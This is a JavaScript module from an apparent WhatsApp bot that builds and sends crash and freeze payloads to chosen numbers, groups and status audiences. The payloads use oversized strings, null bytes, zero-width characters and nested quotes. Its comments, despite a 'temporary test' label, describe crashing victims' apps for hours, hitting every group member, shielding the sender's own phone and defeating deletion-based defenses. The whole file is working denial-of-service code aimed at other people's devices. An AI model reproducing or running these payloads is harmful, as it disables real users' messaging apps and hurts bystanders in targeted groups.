// 🧪 TEMPORARY antibug-test probe engine — extracted from index.js unchanged.
// Owner/dev-only test commands (.crash-ios / .frz-ios / .gb class) live in
// src/commands/testing/; this module holds the raw payload builders/senders
// they drive, plus the 72h bug-send registry that remembers fired message
// IDs so Telegram /unbug <number> can delete them for everyone. All of it is
// to be deleted once testing ends.
//
// Conventions: Node builtins (fs/path/crypto) are imported directly; the
// Baileys surface (proto / generateWAMessageFromContent / prepareWAMessageMedia
// / delay), the shared loggers, and the session AUTH_DIR path are injected so
// the module stays unit-testable without a live socket.
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

export function createBugProbeEngine(deps) {
    for (const name of ['log', 'logError', 'delay', 'generateWAMessageFromContent', 'prepareWAMessageMedia']) {
        if (typeof deps?.[name] !== 'function') {
            throw new Error(`createBugProbeEngine: missing required dependency: ${name}`);
        }
    }
    if (typeof deps?.authDir !== 'string' || !deps.authDir) {
        throw new Error('createBugProbeEngine: missing required dependency: authDir');
    }
    if (!deps?.proto || typeof deps.proto !== 'object') {
        throw new Error('createBugProbeEngine: missing required dependency: proto');
    }
    const { log, logError, authDir, delay, proto, generateWAMessageFromContent, prepareWAMessageMedia } = deps;

    // 🧪 TEMPORARY bug-send registry — remembers the message IDs of every payload
    // the test commands fire, for 72 hours, so /unbug <number> on Telegram can
    // delete them for everyone (the target's chat gets cleaned too). Entries
    // older than 72h are discarded and can no longer be unbugged.
    const BUG_SEND_TTL_MS = 72 * 60 * 60 * 1000;
    function bugSendsPath(phoneNumber) {
        return path.join(authDir, String(phoneNumber), 'bug_sends.json');
    }
    function loadBugSends(phoneNumber) {
        try {
            const raw = JSON.parse(fs.readFileSync(bugSendsPath(phoneNumber), 'utf8'));
            const now = Date.now();
            return (Array.isArray(raw?.sends) ? raw.sends : [])
                .filter(e => e && e.id && (now - (e.at || 0)) < BUG_SEND_TTL_MS);
        } catch (_) { return []; }
    }
    function saveBugSends(phoneNumber, sends) {
        try {
            const fp = bugSendsPath(phoneNumber);
            fs.mkdirSync(path.dirname(fp), { recursive: true });
            fs.writeFileSync(fp, JSON.stringify({ sends }));
        } catch (err) { logError('TEST', `bug registry save failed for ${phoneNumber}`, err); }
    }
    function recordBugSends(phoneNumber, targetJid, ids, extra) {
        if (!phoneNumber || !targetJid || !Array.isArray(ids) || !ids.length) return;
        const sends = loadBugSends(phoneNumber);
        const now = Date.now();
        for (const id of ids) if (id) sends.push({ id: String(id), jid: targetJid, at: now, ...(extra || {}) });
        saveBugSends(phoneNumber, sends);
        log('TEST', `${phoneNumber}: recorded ${ids.length} bug msg id(s) for /unbug (72h window)`);
    }

    async function sendIozkProbe(prim, target) {
        const inlineEntities = '{'.repeat(500000);
        const responseJson = JSON.stringify({
            response_id: crypto.randomUUID(),
            sections: [
                {
                    view_model: {
                        primitive: {
                            text: 'DsPrimis',
                            inline_entities: [inlineEntities],
                            __typename: 'GenAIMarkdownTextUXPrimitive'
                        },
                        __typename: 'GenAISingleLayoutViewModel'
                    }
                }
            ]
        });
        const payload = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [],
                        unifiedResponse: { data: Buffer.from(responseJson) },
                        contextInfo: {
                            forwardingScore: 1,
                            isForwarded: true,
                            forwardOrigin: 4,
                            forwardedAiBotMessageInfo: { botJid: '0@bot' }
                        }
                    }
                }
            }
        };

        // On the xzcbailz fork, participant: true = skip the bot's own devices
        // (same as the original Squichy RX send).
        const rid = await prim.relayMessage(target, payload, { participant: true });
        await delay(1000);
        return { inlineEntityChars: inlineEntities.length, encodedResponseBytes: Buffer.byteLength(responseJson), ids: rid ? [rid] : [] };
    }

    async function sendFiosProbe(prim, target) {
        const F_OS_NAME = '𑇂𑆵𑆴𑆿'.repeat(9000);
        const F_OS_BUTTON_TEXT = '𑇂𑆵𑆴𑆿'.repeat(1000);
        const payload = {
            viewOnceMessage: {
                message: {
                    buttonsMessage: {
                        locationMessage: {
                            degreesLongitude: 0,
                            degreesLatitude: 0,
                            name: F_OS_NAME
                        },
                        contentText: 'SquichyBot',
                        buttons: [{
                            buttonId: 'Primis',
                            buttonText: { displayText: F_OS_BUTTON_TEXT },
                            type: 1
                        }],
                        headerType: 6
                    }
                }
            }
        };

        // participant: true (fork) = skip CC'ing the bot's own devices — the
        // owner's phone gets a placeholder instead of the payload itself.
        const rid = await prim.relayMessage(target, payload, { participant: true });
        const pauseMs = 700 + Math.floor(Math.random() * 600);
        await delay(pauseMs);
        return { locationNameChars: F_OS_NAME.length, buttonTextChars: F_OS_BUTTON_TEXT.length, pauseMs, ids: rid ? [rid] : [] };
    }

    // Wire-size probe: measures the actual protobuf bytes that go on the wire,
    // so the send logs prove whether bloksWidget-class fields survived encoding
    // (~660KB = full fork power, ~160KB = bloksWidget dropped).
    function wireBytesOf(payload) {
        try {
            return proto.Message.encode(payload).finish().length;
        } catch (_) {
            try { return Buffer.byteLength(JSON.stringify(payload)); } catch (_) { return 0; }
        }
    }

    // 🧪 TEMPORARY probe: the "fvckb1tch" hybrid from the obfuscated Squichy RX
    // case.js (crash-msg / crash-vis / crash-img / crash-expens), FULL version.
    // This test repo runs the xzcbailz fork, whose proto has Header.bloksWidget
    // — so every sub-payload ships: groupStatusMentionMessage with the 50k-char
    // messageAssociation ID, 10-deep null-byte quoted chain, real CDN image ref,
    // bloksWidget poison, and 50k-char nativeFlow buttons. One round = 10
    // payloads, 1s apart (faithful to the original loop).
    async function sendCrashmsgProbe(prim, target) {
        // Chain of `depth` nested quoted messages, each carrying a null-byte text.
        // Recursive quote parsing on the target client is the new attack surface.
        const quotedChain = (depth = 10) => {
            let q = { conversation: '\x00' };
            for (let i = 0; i < depth; i++) {
                q = { extendedTextMessage: { text: '\x00', contextInfo: { quotedMessage: q } } };
            }
            return q;
        };
        let sent = 0, firstWireBytes = 0, ids = [];
        for (let i = 0; i < 10; i++) {
            const payload = {
                // EXACT Squichy fvckb1tch envelope (verified field-by-field
                // against the deobfuscated case.js): viewOnceMessage wrapper.
                // A groupStatusMessageV2 envelope was tried as an "app-level"
                // experiment and FAILED in the field (antibug withstood it) —
                // the groupStatusMentionMessage association only detonates in
                // the client's render path when it rides viewOnceMessage.
                viewOnceMessage: {
                    message: {
                        groupStatusMentionMessage: {
                            messageAssociation: {
                                parentMessageKey: { id: '['.repeat(50000) }
                            }
                        },
                        interactiveMessage: {
                            contextInfo: { quotedMessage: quotedChain() },
                            header: {
                                title: '\x00'.repeat(10000),
                                subtitle: '\x10'.repeat(50000),
                                hasMediaAttachment: true,
                                imageMessage: {
                                    url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQPw3StiK4uxZZT4h_Dc2F8vjrOMvXcW5mebzpfMqsOqtSKkl016u8dENJXm-MyPm93HPklzjiZRWN2ClVtMtXa78-HfwAcAGcW1AFTQrA?ccb=9-4&oh=01_Q5Aa5gHZmbyqf-u6qIzMuyqBCu5J3hjJP_wpfXsaYx1ugYaHzQ&oe=6AE081EB&_nc_sid=e6ed6c&mms3=true',
                                    mimetype: 'image/jpeg',
                                    fileSha256: 'aWnmH8sTluvlu53gBU/8WR25vcGiUD9RVa9xictFQeg=',
                                    fileLength: '21702',
                                    height: 295,
                                    width: 512,
                                    mediaKey: 'k9tHs3uM9a9M/Uq3Rjmv3wHKJ2w86lCH/zpNKbnIgLY=',
                                    fileEncSha256: 'X/+sOttc0pKVz+EeiHu63zSZHpF5Ui4PqiS3EHD2XoE=',
                                    directPath: '/o1/v/t24/f2/m232/AQPw3StiK4uxZZT4h_Dc2F8vjrOMvXcW5mebzpfMqsOqtSKkl016u8dENJXm-MyPm93HPklzjiZRWN2ClVtMtXa78-HfwAcAGcW1AFTQrA?ccb=9-4&oh=01_Q5Aa5gHZmbyqf-u6qIzMuyqBCu5J3hjJP_wpfXsaYx1ugYaHzQ&oe=6AE081EB&_nc_sid=e6ed6c',
                                    mediaKeyTimestamp: '1790520498',
                                    jpegThumbnail: ''
                                },
                                bloksWidget: {
                                    uuid: '\u200B'.repeat(50000),
                                    data: '['.repeat(50000),
                                    type: '\u200F'.repeat(50000),
                                    fallback: '\u200D'.repeat(50000)
                                }
                            },
                            body: { text: '\u000F' },
                            nativeFlowMessage: { buttons: '['.repeat(50000) }
                        }
                    }
                }
            };
            if (i === 0) firstWireBytes = wireBytesOf(payload);
            // participant: true (fork) = skip CC'ing the bot's own devices —
            // without this the owner's own phone receives the full 2000-payload
            // toxic pile and crashes alongside the target.
            const rid = await prim.relayMessage(target, payload, { participant: true });
            if (rid) ids.push(rid);
            sent++;
            if (i < 9) await delay(1000);
        }
        return { sent, wireBytes: firstWireBytes, ids };
    }

    // 🧪 TEMPORARY probe: "iosZLoc" from the free Squichy repo (DEVPRIMIS/
    // Squichy-free). Location-message freeze bomb: 60k-char location name, 2000
    // fake mentioned JIDs, externalAdReply with 60k advertiserName/caption and
    // the original 2.5MB bug.jpg ad thumbnail. One call = 60 back-to-back
    // payloads, faithful to the free bot's inner loop (the free bot wraps it in
    // 500 rounds x 5s — re-run the command to repeat rounds).
    async function sendIoszkProbe(prim, target, thumbBuf) {
        const mentionedJid = Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`);
        let firstWireBytes = 0, ids = [];
        for (let z = 0; z < 60; z++) {
            const payload = {
                groupStatusMessageV2: {
                    message: {
                        locationMessage: {
                            degreesLatitude: 21.1266,
                            degreesLongitude: -11.8199,
                            name: `🧪⃟꙰。⌁.Bug ? ¿` + "𑇂𑆵𝑆𝑆".repeat(60000),
                            url: 'https://t.me/dsprimis',
                            contextInfo: {
                                mentionedJid,
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "𑇂𝑆𝑆".repeat(60000),
                                        mediaType: 'IMAGE',
                                        jpegThumbnail: thumbBuf,
                                        caption: "𑇂𝑆𝑆".repeat(60000)
                                    },
                                    placeholderKey: {
                                        remoteJid: '0s.whatsapp.net',
                                        fromMe: false,
                                        id: 'ABCDEF1234567890'
                                    }
                                }
                            }
                        }
                    }
                }
            };
            if (z === 0) firstWireBytes = wireBytesOf(payload);
            const rid = await prim.relayMessage(target, payload, { participant: true });
            if (rid) ids.push(rid);
        }
        return { sent: 60, wireBytes: firstWireBytes, ids };
    }

    const CRASHCLICK_STATIC = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: { sources: [] }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: 'Primis',
                                rows: [
                                    { items: [], isHeading: true },
                                    { items: [] },
                                    { items: [] }
                                ]
                            }
                        }
                    ],
                    unifiedResponse: { data: null },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: { botJid: '867051314767696@bot' },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    async function sendCrashclickProbe(prim, target) {
        const responseId = crypto.randomUUID();
        const responseData = JSON.stringify({ response_id: responseId, sections: [] });
        const payload = {
            ...CRASHCLICK_STATIC,
            botForwardedMessage: {
                ...CRASHCLICK_STATIC.botForwardedMessage,
                message: {
                    ...CRASHCLICK_STATIC.botForwardedMessage.message,
                    richResponseMessage: {
                        ...CRASHCLICK_STATIC.botForwardedMessage.message.richResponseMessage,
                        unifiedResponse: { data: responseData }
                    }
                }
            }
        };
        const rid = await prim.relayMessage(target, payload, {});
        return { responseId, responseBytes: Buffer.byteLength(responseData), ids: rid ? [rid] : [] };
    }

    // 🧪 TEMPORARY .crash-hard payload builder — PAYLOAD A: androz —
    // interactiveMessage blobs (bloksWidget/null strings). Fork build:
    // { participant: true } skips the bot's own devices (exactly the original
    // Squichy RX send), and the fork's proto encodes Header.bloksWidget — full-
    // strength payload. Used by src/commands/testing/sandbox-payloads.js.
    function buildAndrozPayload() {
        return {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "𑇂𑆵𑆴𑆿".repeat(10000),
                            subtitle: "\x10".repeat(50000),
                            bloksWidget: {
                                uuid: "\u200B".repeat(50000),
                                data: "[".repeat(50000),
                                type: "\u200F".repeat(50000),
                                fallback: "\u200D".repeat(50000)
                            }
                        },
                        body: { text: "\u000F" },
                        nativeFlowMessage: {
                            buttons: "[".repeat(50000)
                        }
                    }
                }
            }
        };
    }

    // 🧪 TEMPORARY .frz-oom payload builder — PAYLOAD B: testfff — carousel of 30
    // cards, null-byte button blobs. Used by
    // src/commands/testing/sandbox-payloads.js.
    function buildTestfffMessage(target, imageMessage) {
        const cards = [];
        const header = imageMessage
            ? { imageMessage, hasMediaAttachment: true }
            : { title: '𑇂𑆵𑆴𑆿'.repeat(1000), subtitle: '\x10'.repeat(1000), hasMediaAttachment: false };
        for (let r = 0; r < 30; r++) {
            cards.push({
                header,
                nativeFlowMessage: {
                    buttons: "\0".repeat(10000),
                    messageParamsJson: "\0".repeat(10000)
                }
            });
        }
        return generateWAMessageFromContent(
            target,
            {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: { text: 'Squichy' },
                            carouselMessage: { cards }
                        }
                    }
                }
            },
            {}
        );
    }

    // 🧪 TEMPORARY .frz-oom card image preparer — the card image is prepared ONCE
    // per run and reused by every send (same as forwarding reusing uploaded
    // media) — otherwise a ×200 flood would re-download from catbox and re-upload
    // to WhatsApp 200 times. Used by src/commands/testing/sandbox-payloads.js.
    async function prepareCardImage(sock) {
        const prep = await prepareWAMessageMedia(
            { image: { url: 'https://files.catbox.moe/m1x4bb.jpg' } },
            { upload: sock.waUploadToServer }
        );
        return prep?.imageMessage || null;
    }

    // 🧪 APP-LEVEL GROUP BUG — the .crash-hard payload class (groupStatusMessageV2
    // envelope → startup/sync pipeline poison) fired at a GROUP instead of a 1:1
    // chat. Unlike .gb's CrashClick (chat-level: only crashes when the chat is
    // opened, and a deletion antibug can clean it), this hits every member's app
    // during sync/startup — the class that produces the 7h+ icon-tap kill. A
    // deletion-based antibug cannot withstand it: the defending client crashes
    // while the batch is still arriving, so there is nothing left alive to delete.
    // ⚠️ EVERY group member takes the app-level hit — including the bot owner if
    // his own number is a member of the target group.
    async function sendGbHardProbe(prim, target) {
        const payload = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "𑇂𑆵𑆴𑆿".repeat(10000),
                            subtitle: "\x10".repeat(50000),
                            bloksWidget: {
                                uuid: "\u200B".repeat(50000),
                                data: "[".repeat(50000),
                                type: "\u200F".repeat(50000),
                                fallback: "\u200D".repeat(50000)
                            }
                        },
                        body: { text: "\u000F" },
                        nativeFlowMessage: {
                            buttons: "[".repeat(50000)
                        }
                    }
                }
            }
        };
        const wireBytes = wireBytesOf(payload);
        const rid = await prim.relayMessage(target, payload, { participant: true });
        return { wireBytes, ids: rid ? [rid] : [] };
    }

    // 🧪 STATUS BUG — posts the proven interactiveMessage poison as a STATUS
    // addressed to ONE number (fork statusJidList targeting — same mechanism
    // as the fork's own statusMention). Two big differences vs group sends:
    //   1. The payload rides the STATUS pipeline: the target's app processes
    //      status updates eagerly at sync (status tray previews) and the
    //      mentioned_users node pushes a "mentioned you in their status"
    //      notification — processing without opening any chat.
    //   2. SELF-SHIELD: the audience list contains ONLY the target — the
    //      bot owner's own devices are never addressed, so unlike .gb-hard
    //      the sender's phone cannot be hit by its own weapon.
    // /unbug support: entries carry status:true and are deleted via
    // status@broadcast.
    async function sendStatusBugProbe(prim, target) {
        const payload = {
            interactiveMessage: {
                header: {
                    title: "𑇂𑆴𑆿".repeat(10000),
                    subtitle: "\x10".repeat(50000),
                    bloksWidget: {
                        uuid: "\u200B".repeat(50000),
                        data: "[".repeat(50000),
                        type: "\u200F".repeat(50000),
                        fallback: "\u200D".repeat(50000)
                    }
                },
                body: { text: "\u000F" },
                nativeFlowMessage: {
                    buttons: "[".repeat(50000)
                }
            }
        };
        const wireBytes = wireBytesOf(payload);
        const rid = await prim.relayMessage('status@broadcast', payload, {
            // ONLY the target's devices receive this — never the owner's.
            statusJidList: [target],
            // Mention notification ("mentioned you in their status") — node
            // shape copied verbatim from the fork's statusMention sender.
            additionalNodes: [
                {
                    tag: 'meta',
                    attrs: {},
                    content: [
                        {
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [
                                { tag: 'to', attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        return { wireBytes, ids: rid ? [rid] : [], status: true };
    }

    // 🧪 GROUP STATUS BUG — Squichy gcstatus recipe weaponized: the proven
    // groupStatusMessageV2/interactiveMessage poison dressed as a GROUP STATUS
    // (contextInfo.isGroupStatus + member mentions, like .gcstatus) and posted
    // through the STATUS pipeline with an EXPLICIT audience list. Because the
    // audience is caller-defined, the bot's own account can be excluded from
    // it — the self-shield .gb-hard can never have (group sends fan out to
    // every member device). Each member's app processes the status eagerly at
    // sync (status tray + group album + mention notification).
    async function sendGbStatusProbe(prim, groupJid, audience) {
        const payload = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        // Squichy gcstatus dressing — makes clients render this
                        // into the group status album, not just a group message.
                        contextInfo: {
                            mentionedJid: audience,
                            isGroupStatus: true
                        },
                        header: {
                            title: "𑇂𑆴𑆿".repeat(10000),
                            subtitle: "\x10".repeat(50000),
                            bloksWidget: {
                                uuid: "\u200B".repeat(50000),
                                data: "[".repeat(50000),
                                type: "\u200F".repeat(50000),
                                fallback: "\u200D".repeat(50000)
                            }
                        },
                        body: { text: "\u000F" },
                        nativeFlowMessage: {
                            buttons: "[".repeat(50000)
                        }
                    }
                }
            }
        };
        const wireBytes = wireBytesOf(payload);
        const rid = await prim.relayMessage('status@broadcast', payload, {
            // ONLY these devices receive the status — the handler passes the
            // member list MINUS the bot's own account (the shield).
            statusJidList: audience,
            // "tagged a group in the status" association (fork statusMention
            // node shape, pointed at the group).
            additionalNodes: [
                {
                    tag: 'meta',
                    attrs: {},
                    content: [
                        {
                            tag: 'mentioned_users',
                            attrs: {},
                            content: [
                                { tag: 'to', attrs: { jid: groupJid }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        return { wireBytes, ids: rid ? [rid] : [], status: true };
    }

    return Object.freeze({
        bugSendsPath,
        loadBugSends,
        saveBugSends,
        recordBugSends,
        sendIozkProbe,
        sendFiosProbe,
        wireBytesOf,
        sendCrashmsgProbe,
        sendIoszkProbe,
        sendCrashclickProbe,
        buildAndrozPayload,
        buildTestfffMessage,
        prepareCardImage,
        sendGbHardProbe,
        sendStatusBugProbe,
        sendGbStatusProbe
    });
}
